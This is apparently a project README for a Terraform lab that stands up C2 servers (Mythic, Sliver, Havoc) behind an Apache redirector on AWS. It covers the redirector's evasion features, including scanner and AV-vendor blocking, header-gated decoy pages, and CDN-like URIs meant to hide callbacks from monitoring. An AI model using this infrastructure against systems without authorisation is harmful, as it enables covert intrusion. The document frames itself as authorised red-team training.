# redStack: A Boot-to-Breach Lab Environment for Red Team Operators

![redStack Banner](assets/redStack-banner.png)

> [!NOTE]
> redStack is now feature complete and supports both public internet deployments and closed environments (HTB/VL/PG) that use OpenVPN. This is actively being tested and debugged, so please reach out with any issues or concerns.

> [!IMPORTANT]
> redStack is not a tutorial on how to use C2 frameworks. It is an environment that removes the infrastructure hurdle so you can focus on learning. The lab gives you a fully configured, production-style red team setup out of the box (Boot-to-Breach). **This lab is strictly for authorized training and lab environments only (HTB, VL, PG, self-hosted cyber ranges, personal lab VMs, etc.). It is not intended for use in real-world engagements or against targets you do not own and have explicit written permission to test.**

> [!CAUTION]
> **AWS TOS: Use at your own risk**
>
> Hosting C2 infrastructure on AWS may raise concerns under the [AWS Acceptable Use Policy](https://aws.amazon.com/aup/). Before deploying, review the AUP and submit the [AWS Penetration Testing / Simulated Events request form](https://aws.amazon.com/security/penetration-testing/). This is the appropriate channel for notifying AWS that you are running security tooling on their infrastructure.
>
> As long as you are using redStack exclusively for personal lab work and authorized training platforms (HTB, VL, PG, self-hosted cyber ranges, etc.), you are generally in the clear. A quick conversation with AWS customer support can confirm this and give you peace of mind specific to your account and usage pattern. To be safe, consider running redStack from a dedicated, single-purpose throwaway AWS account used solely for this lab. That isolates billing alerts and removes any risk to other workloads or account standing.

## Quick Start

**What you deploy:** 6 EC2 instances (3 C2 servers + Apache redirector + Guacamole jumpbox + Windows operator workstation) across 2 peered VPCs in a single AWS account.

**Time to ready:** ~10 to 15 min `terraform apply` + ~5 to 10 min cloud-init, plus a one-time SSL cert and Havoc build on first deploy.

**Cost:** ~$5 to $9/mo for 5 to 10 hrs/wk of study with `terraform destroy` between sessions (recommended). ~$26 to $30/mo if you stop but do not destroy between sessions. ~$172/mo if left running 24/7. Full breakdown in [Cost Management](#cost-management).

**Pick a mode** (full decision tree in [Deployment Modes](#deployment-modes)):

- **Open environment** (default): public domain + Let's Encrypt HTTPS. Use for general study, payload testing, AV evasion practice. Requires a domain you own.
- **Closed environment**: HTB / VulnLab / Proving Grounds Pro Labs over OpenVPN. No public DNS, self-signed cert. Skip the domain steps and follow [Part 8](#part-8-external-target-environments-htbvlpg).

**You will need:**

- AWS account (a dedicated throwaway is strongly recommended) with EC2 quota for at least 6 instances and 2 VPCs
- Terraform >= 1.0 and AWS CLI
- An RSA SSH key pair created in AWS (Step 0.4)
- A domain name (open environment only)
- ~$30/mo budget

**The 6-step path:** Part 0 (prerequisites) > Part 1 (`terraform apply`) > Part 2 (verify access) > Part 3 (SSL + redirector) > Parts 4 to 6 (Mythic / Sliver / Havoc) > Cleanup with `terraform destroy`.

> - Requests without a valid `X-Request-ID` header receive a decoy CloudEdge CDN maintenance page
> - Only requests with a matching URI prefix and the correct header token are proxied to the correct C2 server
> - `redirect.rules` blocks AV vendors and TOR exits (403)
> - Run `terraform output network_architecture` to see the diagram populated with your actual IPs

---

## Lab Inventory

Six instances are deployed by default. Only the Guacamole portal and the Apache redirector hold public Elastic IPs. Everything else lives inside private VPCs and is reached through Guacamole.

| Hostname | Role | Public IP | Default access | Credentials source |
| --- | --- | --- | --- | --- |
| `guac` | Guacamole portal (web SSH/RDP/VNC) | Yes | `https://<guac-eip>/guacamole` | `terraform output deployment_info` |
| `redirector` | Apache reverse proxy / C2 frontend | EIP exposes 80/443 only | Guacamole > Apache Redirector SSH (or `ssh -J` via guac) | `terraform output deployment_info` |
| `mythic` | Mythic C2 server | No | Guacamole > Mythic SSH (or `ssh -J` via guac) | `terraform output deployment_info` |
| `sliver` | Sliver C2 server | No | Guacamole > Sliver SSH (or `ssh -J` via guac) | `terraform output deployment_info` |
| `havoc` | Havoc C2 server + Havoc desktop (VNC) | No | Guacamole > Havoc SSH or VNC | `terraform output deployment_info` |
| `WIN-OPERATOR` | Windows operator workstation | No | Guacamole > Windows Operator (RDP) | AWS-decrypted, shown in `terraform output deployment_info` |

**One command for everything:** `terraform output deployment_info` prints all IPs, the auto-generated lab password, the Windows Administrator password, and the C2 header token. Save it once after deploy.

---

## Deployment Modes

redStack runs in one of two modes. Pick before you fill out `terraform.tfvars`. The choice changes only a handful of variables and a couple of post-deploy steps.

| | **Open environment** (default) | **Closed environment** (HTB / VL / PG) |
| --- | --- | --- |
| **Use when** | General study, payload testing, AV evasion practice over the public internet | Pro Labs reachable only over OpenVPN (HackTheBox, VulnLab, Proving Grounds) |
| **DNS** | You own a public domain and create A records to the redirector | None. Redirector is reached by its public Elastic IP |
| **TLS** | Let's Encrypt cert via Certbot (manual one-time step) | Self-signed cert with the public IP as Subject Alternative Name (auto-generated at deploy) |
| **Scanner blocking** | `redirect.rules` enabled (blocks AV vendors, TOR exits) | Disabled (not needed in isolated lab networks) |
| **VPN tunnel** | None | OpenVPN client on redirector + WireGuard tunnel from C2 VPC > redirector |
| **Key tfvars** | `redirector_domain = "yourdomain.tld"` | `redirector_domain = ""`, `enable_external_vpn = true`, `enable_redirector_htaccess_filtering = false` |
| **Path through this guide** | Parts 0 to 7 in order | Parts 0 to 7, but skip Steps 1.6 and 3.1; then follow [Part 8](#part-8-external-target-environments-htbvlpg) |

> [!NOTE]
> Both modes use the same network architecture, the same C2 stack, and the same Guacamole portal. Only the front door changes.

---

## Timing Expectations

Set expectations before you start. Most timing surprises in redStack come from the Windows boot and the Havoc build.

| Phase | Duration | Notes |
| --- | --- | --- |
| `terraform apply` | ~10 to 15 min | 50+ AWS resources |
| Cloud-init on Linux hosts | ~5 to 10 min | Mythic Docker pulls, Apache config, redirect.rules download |
| Windows initialization | up to ~15 min | Slowest component. RDP becomes available last |
| Certbot SSL issuance (open mode only) | ~30 sec | After DNS propagates |
| Havoc build (one-time, first deploy only) | ~15 to 25 min | Compiles teamserver from source on `havoc` |
| Mythic agent build | ~30 to 60 sec | Per agent |
| First C2 callback after agent execution | ~10 sec | Depending on `callback_interval` |
| `terraform destroy` | ~5 min | Releases EIPs, terminates instances, removes VPCs |

---

## Part 0: Pre-Deployment Checklist

### Prerequisites

- [ ] AWS account with IAM credentials
- [ ] AWS CLI installed and configured
- [ ] Terraform >= 1.0 installed
- [ ] Your public IP obtained
- [ ] Repository cloned (see Step 0.1)
- [ ] SSH key pair created in AWS EC2 (see Step 0.4 below)

### Step 0.1: Clone Repository & Install Tools

**Clone the repository:**

```bash
git clone https://github.com/BaddKharma/redStack.git
cd redStack
```

> [!NOTE]
> All subsequent commands should be run from inside the `redStack/` directory. This ensures the SSH key pair created in Step 0.4 lands in the right place.

**Install AWS CLI:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install awscli` |
| Linux (Ubuntu/Debian) | `sudo apt install awscli` |
| Linux (any) | `curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && unzip awscliv2.zip && sudo ./aws/install` |
| Windows | Download and run the MSI installer from <https://aws.amazon.com/cli/> |

**Install Terraform:**

| Platform | Command |
| -------- | ------- |
| macOS | `brew install terraform` |
| Linux (Ubuntu/Debian) | See <https://developer.hashicorp.com/terraform/install> |
| Windows | `choco install terraform` or download from <https://developer.hashicorp.com/terraform/install> |

**Checkpoint:** ✅ Repository cloned, AWS CLI and Terraform installed

### Step 0.2: AWS IAM Permissions

redStack provisions EC2, VPC, security group, Elastic IP, network interface, key pair, and IAM resources. Your AWS credentials need sufficient permissions to create and destroy all of these.

**For both options:** Go to **IAM Console** > **Users** > **Create user**, set a username (e.g., `redS-operator`), then under **Security credentials** create an access key and save the Access Key ID and Secret Access Key.

**Option A: AdministratorAccess (recommended. Use this unless you have a specific reason not to)**

This is the right choice for the vast majority of redStack users.

If you followed the earlier recommendation and created a dedicated AWS account solely for this lab, `AdministratorAccess` is the practical default. There are no other workloads, billing resources, or sensitive data in the account to protect. On an empty account, admin access carries the same real-world risk as a scoped policy. If the credentials are compromised, the attacker can only touch the lab infrastructure you already plan to tear down.

Least privilege adds meaningful protection when credentials could expose things beyond this lab. On a dedicated account, there is nothing else to expose. Use Option A and save Option B for when it actually buys you something.

<details>
<summary>How to create the IAM user and attach AdministratorAccess (click to expand)</summary>

```yaml
Step 1: IAM Console > Users > Create user
Step 2: Username - redS-operator
Step 3: Permissions > Attach policies directly > search "AdministratorAccess"
Step 4: Check AdministratorAccess > Next > Create user
Step 5: Open the new user > Security credentials > Create access key
Step 6: Select - Command Line Interface (CLI) > acknowledge > Next
Step 7: Copy the Access Key ID and Secret Access Key (the secret is shown only once)
```

</details>

**Option B: Least Privilege (only if you are deploying into a shared or production account)**

Use this option if the AWS account running redStack also contains other workloads, active resources, or anything you cannot afford to lose or expose. In that context, scoping the credentials to only what redStack needs limits the blast radius if the access key is ever leaked or misused.

The policy grants `ec2:*` for all Terraform operations, `sts:GetCallerIdentity` so Terraform can verify credentials at init, and four read-only IAM actions scoped to your own user so you can inspect your own permissions when troubleshooting. Nothing outside of EC2 and self-inspection is granted.

If you are not sure which account type you have, go back and re-read the dedicated account recommendation at the top of this section. Setting up a separate account is a one-time five-minute task and removes the need for this option entirely.

<details>
<summary>How to create the IAM user and attach the least-privilege policy (click to expand)</summary>

```yaml
Step 1:  IAM Console > Users > Create user
Step 2:  Username - redS-operator
Step 3:  Permissions > Attach policies directly > Create policy
Step 4:  Select the JSON tab and paste the policy shown below
Step 5:  Name the policy - redStack-least-privilege > Create policy
Step 6:  Back on the user creation screen, search for and attach redStack-least-privilege
Step 7:  Next > Create user
Step 8:  Open the new user > Security credentials > Create access key
Step 9:  Select - Command Line Interface (CLI) > acknowledge > Next
Step 10: Copy the Access Key ID and Secret Access Key (the secret is shown only once)
```

</details>

<!-- -->

**Minimum IAM Policy:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "ec2:*",
        "sts:GetCallerIdentity"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": [
        "iam:GetUser",
        "iam:GetUserPolicy",
        "iam:ListUserPolicies",
        "iam:ListAttachedUserPolicies"
      ],
      "Resource": "arn:aws:iam::*:user/${aws:username}"
    }
  ]
}
```

> [!NOTE]
> **Why these permissions:**
>
> - **`ec2:*`**: redStack is EC2-only infrastructure. Every resource Terraform creates and destroys (instances, VPCs, subnets, security groups, ENIs, EIPs, VPC peering) maps to an EC2 API call. No S3, RDS, Lambda, or other services are used.
> - **`sts:GetCallerIdentity`**: Terraform calls this at init to verify credentials and identify the account. Without it, `terraform init` fails before any resources are touched.
> - **`iam:GetUser`, `iam:GetUserPolicy`, `iam:ListUserPolicies`, `iam:ListAttachedUserPolicies`**: Read-only, self-scoped to `${aws:username}`. Lets you inspect your own permissions when debugging an access denied error. No IAM write access is granted and the scope prevents reading any other principal's policies.

**Configure AWS CLI:**

Running `aws configure` writes your credentials and preferences to `~/.aws/credentials` and `~/.aws/config`. This is how Terraform (and the AWS CLI) know which account to talk to and which region to deploy into. You only need to do this once per machine.

```bash
aws configure
```

<details>
<summary>What each prompt is asking for (click to expand)</summary>

- **AWS Access Key ID**: The access key you generated under **Security credentials** for your IAM user. Identifies which user is making requests.
- **AWS Secret Access Key**: The secret shown once at key creation time. Acts as the password paired with the Access Key ID. If you did not save it, delete the key and create a new one.
- **Default region name**: The AWS region where redStack will be deployed. Use `us-east-1` unless you have a specific reason to pick another. This must match the `aws_region` value in `terraform.tfvars`.
- **Default output format**: Controls how the AWS CLI formats responses. Use `json`. Terraform does not use this setting but it makes CLI output readable when troubleshooting.

</details>

**Checkpoint:** ✅ IAM user created and AWS CLI configured with the new credentials

### Step 0.3: Verification Commands

```bash
# Check AWS access
aws sts get-caller-identity

# Check Terraform
terraform --version

# Get your public IP
curl -s ifconfig.me
```

**Expected Results:**

- AWS CLI returns your account details (Account, Arn, UserId)
- Terraform version 1.0 or higher
- Public IP address displayed

**Checkpoint:** ✅ AWS CLI and Terraform working, public IP noted

### Step 0.4: Create AWS SSH Key Pair (Required)

**Terraform does NOT create the SSH key pair - you must create it manually first.**

<details>
<summary>Windows (PowerShell)</summary>

```powershell
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text | Out-File -Encoding ascii rs-rsa-key.pem
icacls "rs-rsa-key.pem" /inheritance:r /grant:r "$($env:USERNAME):R"
```

</details>

<details>
<summary>Linux/Mac (bash)</summary>

```bash
aws ec2 create-key-pair --key-name rs-rsa-key --query 'KeyMaterial' --output text > ./rs-rsa-key.pem
chmod 400 ./rs-rsa-key.pem
```

</details>

**Verify key pair exists:**

```powershell
aws ec2 describe-key-pairs --key-names rs-rsa-key
```

> [!NOTE]
> You can also create the key pair in the AWS Console under EC2 > Key Pairs > Create key pair. Use RSA and .pem format. Download the file into your `redStack/` directory and fix permissions with the `icacls` command above.

**Checkpoint:** ✅ SSH key pair created and .pem file saved in project folder

---

## Part 1: Initial Deployment

_Deploy all AWS infrastructure using Terraform: VPCs, security groups, EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Apache redirector)._

### Step 1.1: Configure Terraform Variables

```bash
cp terraform.tfvars.example terraform.tfvars
nano terraform.tfvars   # Linux/Mac
notepad terraform.tfvars  # Windows
```

**Required Changes (no defaults, must be set):**

```hcl
localPub_ip          = "YOUR_IP/32"           # Replace with your IP + /32
ssh_key_name         = "rs-rsa-key"           # Must match your AWS key pair name
ssh_private_key_path = "./rs-rsa-key.pem"     # Path to your .pem file (for Windows password decryption)
```

> [!NOTE]
> **Default deployment uses a public domain with htaccess filtering enabled.** This is the standard mode for open lab environments and is what the rest of this guide assumes. The closed environment option below is only for HTB/VL/PG Pro Labs and other isolated OpenVPN environments where no public DNS exists.
>
> **Open environment** (default: internet access, domain registered):
> Set `redirector_domain` to your domain. Complete Step 1.6 (DNS) and Step 3.1 (Certbot) to get a trusted TLS certificate. Agents call back using your domain over HTTPS. Scanner/AV blocking via `redirect.rules` is enabled by default.
>
> ```hcl
> redirector_domain = "c2.yourdomain.tld"

> **Closed environment** (HTB/VL/PG Pro Labs, OpenVPN-only, no public DNS):
> Leave `redirector_domain` empty and set the two ExtVPN toggles below. The redirector uses its public Elastic IP as the server identity with a self-signed certificate. Scanner/AV blocking is disabled since it is not needed in lab environments. Skip Step 1.6 and Step 3.1. See Part 8 for the full ExtVPN deployment workflow.

> ```hcl
> # redirector_domain = ""                    # leave empty; redirector uses its public IP
> enable_external_vpn                  = true  # enables OpenVPN client + VPC routing
> enable_redirector_htaccess_filtering = false  # disables scanner/AV blocking (not needed in labs)
> ```

**Optional:** these have sensible defaults but affect callback URLs baked into payloads and VPN routing. Review before deploying:

```hcl
# Network: by default redStack creates a dedicated VPC (10.50.0.0/16) for the team server.
# This keeps the lab isolated and avoids conflicts with other AWS workloads in the same account.
# If you need to use an existing default VPC instead (e.g. if you hit the VPC limit), set:
#   use_default_vpc = true
# Leave vpc_cidr as-is unless the default range conflicts with something on your network.
use_default_vpc = false
vpc_cidr        = "10.50.0.0/16"

# Instance types: adjust for budget/performance
sliver_instance_type = "t3.small"
havoc_instance_type  = "t3.medium"

# C2 URI prefixes (CDN/cloud-style paths on the redirector)
# These are baked into payloads at deploy time. Customize before deploying.
mythic_uri_prefix = "/cdn/media/stream"
sliver_uri_prefix = "/cloud/storage/objects"
havoc_uri_prefix  = "/edge/cache/assets"

# --- ExtVPN/Pro Lab mode (HTB/VL/PG via OpenVPN) ---
# Default is open-environment (public domain + htaccess on). Only change these for ExtVPN/Pro Lab use.
enable_external_vpn                  = false  # Set to true for HTB/VL/PG. Enables OpenVPN client + VPC routing (see Part 8)
enable_redirector_htaccess_filtering = true   # Set to false for HTB/VL/PG. Scanner/AV blocking not needed in lab environments

# C2 header validation is always enabled. These override the defaults:
# c2_header_name  = "X-Request-ID"  # Header name (default: X-Request-ID)
# c2_header_value = ""              # Token value. Leave empty to auto-generate (recommended)

# Optional: custom tags applied to every AWS resource (instances, SGs, Elastic IPs, etc.)
# Useful for cost tracking and filtering resources in the AWS Console
tags = {
  Owner      = "Operator"
  CostCenter = "redStack"
  Purpose    = "Boot-to-Breach Training Environment"
}
```

> [!NOTE]
> **Header validation is always enabled.** `c2_header_name` and `c2_header_value` are optional overrides, not toggles. Leaving them out means the header name defaults to `X-Request-ID` and the token is auto-generated at deploy time. Retrieve the active token after deployment with `terraform output deployment_info`.

Passwords are auto-generated during deployment. A single random password is used for SSH and Guacamole admin access. The Windows Administrator password is generated by AWS and decrypted automatically using your SSH private key. Retrieve credentials after deployment with:

```bash
terraform output deployment_info
```

<summary><strong>Terraform Primer:</strong> new to Terraform? Click to expand.</summary>

If you are new to Terraform, here is a quick overview of the four commands used in this guide:

| Command | What it does |
| --- | --- |
| `terraform init` | Downloads provider plugins and initializes the working directory. Run once before anything else, or after adding new providers. |
| `terraform plan` | Dry run. Shows exactly what Terraform will create, change, or destroy. No changes are made. Useful for catching syntax or provisioning errors before a full `terraform apply`. |
| `terraform apply` | Provisions the infrastructure defined in your `.tf` files. Terraform will print the plan and prompt you to type `yes` before making any changes. |
| `terraform destroy` | Tears down all infrastructure managed by Terraform in this directory. You will be prompted to confirm. Run this when you are done with the lab to avoid ongoing AWS charges. Before redeploying, verify the destroy completed cleanly: check your [AWS EC2 Dashboard](https://console.aws.amazon.com/ec2/home) and confirm all redStack instances show as terminated and no Elastic IPs remain allocated. |

For full command reference, see the [Terraform CLI documentation](https://developer.hashicorp.com/terraform/cli/commands).

</details>

<details>
<summary><strong>AWS EC2 Dashboard Primer:</strong> not familiar with the AWS Console? Click to expand.</summary>

The [AWS EC2 Dashboard](https://console.aws.amazon.com/ec2/home) is your primary visibility tool for what Terraform has built (or destroyed) in AWS. You will use it to verify deployments and confirm clean teardowns. Key sections:

| Section | Where to find it | What to check |
| --- | --- | --- |
| **Instances** | EC2 > Instances > Instances | All 6 redStack instances should show `running` after `terraform apply`. After `terraform destroy`, all should show `terminated`. |
| **Elastic IPs** | EC2 > Network & Security > Elastic IPs | Two EIPs are allocated at deploy time (Guacamole, Redirector). After `terraform destroy`, both should be released (not listed). Unreleased EIPs incur charges. |
| **Key Pairs** | EC2 > Network & Security > Key Pairs | Confirm `rs-rsa-key` exists before deploying. Terraform does not create this. It must be present or `terraform apply` will fail. |
| **VPCs** | VPC > Your VPCs | Two VPCs are created: TeamServer VPC (`172.31.0.0/16`) and Redirector VPC (`10.60.0.0/16`). After destroy, both should be gone. |

**Quick region check:** Make sure the AWS Console region (top-right dropdown) matches the region in your `terraform.tfvars` (`us-east-1` by default). Resources created in one region are invisible when viewing another.

</details>

---

> [!CAUTION]
> **AWS Cost Warning: Unattended Instances**
>
> Running EC2 instances accrue charges 24/7 whether you are actively using them or not. Forgetting about a deployed lab is one of the most common causes of unexpected AWS bills. A few things to keep in mind:
>
> - **Recommended pattern: `terraform destroy` after each study session.** For a 5 to 10 hrs/wk study cadence, destroying between sessions costs ~$5 to $9/mo (compute only) versus ~$26 to $30/mo for a stopped-but-not-destroyed lab. Redeploy in ~30 to 45 min next time.
> - **Stopping instances does not eliminate charges.** EBS volumes (~$14/mo) and Elastic IPs (~$7/mo) bill 24/7 even when instances are stopped. That is ~$21/mo of fixed cost for a paused deployment.
> - **`terraform destroy` is the only way to zero out charges.** It terminates instances, releases Elastic IPs, and removes EBS volumes.
> - **Set a billing alarm.** In the [AWS Billing Console](https://console.aws.amazon.com/billing/home), create a CloudWatch billing alarm to alert you if monthly charges exceed a threshold you set. This is the best safeguard against runaway costs from forgotten resources.
>
> See [Cost Management](#cost-management) below for the full breakdown across destroy/redeploy, stopped, and 24/7 scenarios.

### Step 1.2: Initialize Terraform

```bash
terraform init
```

**Expected Output:**

```bash
Initializing the backend...
Initializing provider plugins...
- Finding hashicorp/aws versions matching "~> 5.0"...
- Installing hashicorp/aws v5.x.x...
Terraform has been successfully initialized!
```

**Checkpoint:** ✅ No errors, providers downloaded

### Step 1.3: Review Deployment Plan

```bash
terraform plan
```

<details>
<summary>Expected output</summary>

- **~50+ resources** to be created
- 6 EC2 instances (Mythic, Sliver, Havoc, Guacamole, Windows, Redirector)
- 2 VPCs (team server VPC + redirector VPC)
- 2 Elastic IPs (Guacamole, Redirector) - **static, persistent IPs**
- Mythic, Sliver, and Havoc have **no public IPs** (internal only)
- Security groups, VPC peering, route tables
- No errors or warnings

</details>

**Checkpoint:** ✅ Plan shows expected resources

### Step 1.4: Deploy Infrastructure

```bash
terraform apply
```

Type `yes` when prompted.

**Expected Output:**

```bash
Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
```

**Checkpoint:** ✅ Terraform apply completed successfully

### Step 1.5: Review Deployment Information

There are two outputs: `deployment_info` (all IPs, credentials, SSH commands) and `network_architecture` (diagram with actual IPs).

```bash
terraform output deployment_info
terraform output network_architecture
```

> [!TIP]
> Save `deployment_info` to a file for quick offline reference. You will need the IPs, credentials, and C2 header throughout this guide.

**Checkpoint:** ✅ Deployment info reviewed, IPs and credentials noted

### Step 1.6: Point Domain to Redirector

> [!NOTE]
> **Closed environment (no DNS):** Skip this step entirely. No domain or DNS record is needed. Proceed to Part 2.

After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.

**Get the Redirector IP:**

```bash
terraform output deployment_info
```

Look for the **APACHE REDIRECTOR** section. The `Public IP` field is what you need.

**Create DNS A Records:**

Log into your domain registrar or DNS provider (e.g., Namecheap, Cloudflare, Route53) and create A records pointing to the redirector's Elastic IP. Use whichever host matches how you set `redirector_domain` in `terraform.tfvars`:

| Type | Host | Value | TTL |
| ---- | ---- | ----- | --- |
| A Record | `@` | `<Redirector Elastic IP>` | Automatic |
| A Record | `www` | `<Redirector Elastic IP>` | Automatic |
| A Record | `sub` | `<Redirector Elastic IP>` | Automatic |

Only `@` (the apex domain) is required. Add `www` only if you want callbacks over `www.yourdomain.tld`.

The `sub` row is a placeholder for any custom subdomain you want to use, for example `test.yourdomain.tld`, `cdn.yourdomain.tld`, or `chat.yourdomain.tld`. Custom subdomains blend beacon and implant traffic into patterns that look like legitimate service traffic. That makes callbacks harder to flag in firewall logs and network monitoring, which simulates real-world C2 tradecraft so you can practice detection and evasion in a lab setting.

**Verify DNS Propagation** (substitute your actual `redirector_domain` value from `terraform.tfvars`):

<details>
<summary>Windows (PowerShell)</summary>

```powershell
Resolve-DnsName yourdomain.tld
```

</details>

<details>
<summary>Linux/Mac (bash)</summary>

```bash
dig +short yourdomain.tld
```

</details>

**Expected:** The IP returned should match your redirector's Elastic IP.

> [!NOTE]
> DNS propagation can vary. Once DNS resolves correctly, proceed to Part 3 to run Certbot and configure the redirector.

**Checkpoint:** ✅ Domain pointed to redirector IP, DNS verified

> [!NOTE]
> **Wait 5-10 minutes before proceeding to Part 2.** User data scripts are installing software on all servers:
>
> - All hosts: Setting descriptive hostnames and populating `/etc/hosts` for cross-host name resolution
> - Mythic (`mythic`): Installing Docker, cloning Mythic, starting ~10 containers (Debian 12)
> - Sliver (`sliver`): Installing Sliver C2 server binary, configuring firewall (Debian 12)
> - Havoc (`havoc`): Installing Go, cloning and building Havoc teamserver from source (Debian 12)
> - Guacamole (`guac`): Setting up PostgreSQL, Nginx, Docker containers (Debian 12)
> - Windows (`WIN-OPERATOR`): Disabling Defender/Firewall, enabling RDP, installing tools (Chromium, VS Code, MobaXterm, 7-Zip)
> - Redirector (`redirector`): Installing Apache with mod_rewrite/proxy, configuring header+URI validation, downloading redirect.rules, setting up SSL and decoy page (Debian 12, fully automated)

---

## Part 2: Verification

Verify all components are accessible before moving to C2 setup. All credentials and IPs come from:

```bash
terraform output deployment_info
```

> **Pre-configured hostnames** are written to `/etc/hosts` on every Linux machine and `C:\Windows\System32\drivers\etc\hosts` on Windows during deployment. Use hostnames (`mythic`, `sliver`, `havoc`, `guac`, `redirector`, `win-operator`) instead of IPs from anywhere inside the lab.

### Step 2.1: Access Guacamole Portal

Open in your browser:

```http
https://<GUAC_PUBLIC_IP>/guacamole
```

- Username: `guacadmin`
- Password: from `terraform output deployment_info`

After logging in you should see **7 pre-configured connections**:

```yaml
Step 1: Windows Operator Workstation  (RDP) - auto-connects with Administrator credentials
Step 2: Mythic C2 Server              (SSH)
Step 3: Guacamole Server              (SSH)
Step 4: Apache Redirector             (SSH)
Step 5: Sliver C2 Server              (SSH)
Step 6: Havoc C2 Server               (SSH)
Step 7: Havoc C2 Desktop              (VNC) - XFCE4 desktop with Havoc GUI client
```

All SSH connections use password auth (no keys needed) pre-configured with the auto-generated lab password.

**Checkpoint:** ✅ Guacamole accessible, 7 connections visible

### Step 2.2: Access Windows Workstation

```yaml
Step 1: Click "Windows Operator Workstation"
Step 2: RDP connects automatically - wait 10-30 seconds for the desktop to load
Step 3: Verify installed - Chromium, VS Code, MobaXterm, 7-Zip
Step 4: Open MobaXterm - the redStack Lab folder has pre-configured SSH sessions for all lab machines
```

**If the connection fails:** Wait 5 more minutes. Windows is the slowest component to initialize.

**Checkpoint:** ✅ Windows desktop accessible, tools present, MobaXterm sessions visible

### Step 2.3: Verify Internal Connectivity

From the Windows workstation open **PowerShell** and ping the lab machines to confirm hostname resolution and network connectivity:

```powershell
ping mythic
ping sliver
ping havoc
ping redirector
ping guac
```

**Expected:** All hostnames resolve and respond.

**Checkpoint:** ✅ All lab machines reachable by hostname from Windows

---

## Part 3: Apache Redirector Configuration

This section covers the one manual step required after deployment (SSL certificate), then walks through the pre-configured security layers.

### Step 3.1: Obtain SSL Certificate

> [!NOTE]
> **Closed environment (no DNS):** Skip this step. A self-signed certificate with your redirector's public IP as the Subject Alternative Name was generated automatically at deploy time. Agents and test commands work over both HTTP and HTTPS using the IP directly. Proceed to Step 3.2.

Once DNS has propagated (Step 1.6), SSH to the redirector and run Certbot.

> [!NOTE]
> The redirector's public Elastic IP exposes only ports 80 and 443. Port 22 is closed on the public face to keep the public attack surface limited to legitimate C2 callback traffic. SSH access is internal only, via Guacamole or a jump through Guacamole.

**Three ways to get a shell on the redirector (pick one):**

| Method | How |
| ------ | --- |
| Via Guacamole (recommended) | Click **"Apache Redirector (SSH)"** in the Guacamole portal |
| From Windows workstation | Open MobaXterm > **redStack Lab** > **Apache Redirector (SSH)** |
| From your host workstation | Jump through Guacamole: `ssh -J admin@<GUAC_PUBLIC_IP> admin@<REDIR_PRIVATE_IP>` |

The host-workstation jump uses Guacamole as the bastion. Pick up the Guacamole public IP and the redirector private IP from `terraform output deployment_info`. Password auth works (no `.pem` needed) using the auto-generated lab password.

<details>
<summary>What is Certbot?</summary>

Certbot is a free, open-source tool from the EFF that automates obtaining and renewing TLS certificates from Let's Encrypt. It updates the HTTPS VirtualHost config and sets up auto-renewal automatically.

**Checkpoint:** ✅ SSL certificate issued, HTTPS active on redirector

### Step 3.2: Run the Connectivity Test

A pre-installed script checks the full redirector stack in one command:

```bash
sudo /home/admin/test_redirector.sh
```

<details>
<summary>Key sections of expected output</summary>

```bash
===== Redirector Connectivity Test =====

[*] Apache status:
● apache2.service - The Apache HTTP Server

```

</details>

> [!NOTE]
> **Sliver and Havoc show FAILED.** This is expected. C2 listeners for Sliver and Havoc have not been started yet (covered in Parts 5 and 6). Mythic shows OK because its HTTP port is reachable before a listener is configured. Re-run this script after completing Parts 5 and 6 to confirm all three backends are reachable.
>
> **C2 routing WITH header returns 404.** The request was proxied to Mythic (header check passed) but Mythic has no listener running yet, so it returns 404. This is correct. If the decoy page is returned instead, the header value is wrong.
>
> **C2 routing WITHOUT header returns 200.** The decoy page is served correctly when no valid header is present.

**Checkpoint:** ✅ Apache active, required modules loaded, VirtualHosts on 80/443, decoy page and header validation working

### Step 3.3: Review Configuration

**Get a shell on the redirector** (Guacamole > "Apache Redirector (SSH)", or jump via Guacamole):

```bash
ssh -J admin@<GUAC_PUBLIC_IP> admin@<REDIR_PRIVATE_IP>
```

**View Active VirtualHosts:**

```bash
sudo apache2ctl -S
```

This shows all configured VirtualHosts (HTTP and HTTPS on ports 80/443).

**View HTTP Config (all C2 routes in one file):**

```bash
sudo cat /etc/apache2/sites-available/redirector-http.conf
```

**View HTTPS Config:**

```bash
sudo cat /etc/apache2/sites-available/redirector-https.conf
```

Each VirtualHost uses three security layers before proxying traffic. Step 3.4 covers each layer in detail.

**Checkpoint:** ✅ Understand the three-layer security model

### Step 3.4: Security Layer Details

#### Layer 1: redirect.rules (Automated Scanner Blocking)

The file `/etc/apache2/redirect.rules` is downloaded at boot from the public [redRules GitHub repo](https://github.com/BaddKharma/redRules), which maintains an adapted version of [curi0usJack's redirect rules](https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10):

- All `302` redirects replaced with `403 Forbidden` responses
- Setup directives stripped (`Define REDIR_TARGET`, `RewriteEngine On`, `RewriteOptions Inherit`)
- AWS/Azure/cloud IP blocks **commented out** (would block our own AWS-hosted C2 callbacks)
- Included in both HTTP and HTTPS VirtualHosts via `Include /etc/apache2/redirect.rules`

```bash
# Check installed rules
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

To update redirect.rules manually:

```bash
# Re-download from redRules repo
curl -sL "https://raw.githubusercontent.com/BaddKharma/redRules/main/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo systemctl reload apache2
```

#### Layer 2: Header Validation

Requests must include the correct `X-Request-ID` header. Without it, Apache serves the CloudEdge CDN decoy page instead of proxying to C2 backends.

Get the required header value from your local machine:

```bash
terraform output deployment_info
# Look for: C2 Header: X-Request-ID: <token>
```

#### Layer 3: URI Prefix Routing

| URI Prefix | Backend | Forwarded as |
| ---------- | ------- | ------------ |
| `/cdn/media/stream/` | Mythic | Prefix stripped > Mythic receives `/callback` |
| `/cloud/storage/objects/` | Sliver | Prefix stripped > Sliver receives `/session` |
| `/edge/cache/assets/` | Havoc | Full path preserved > Havoc receives `/edge/cache/assets/update` |

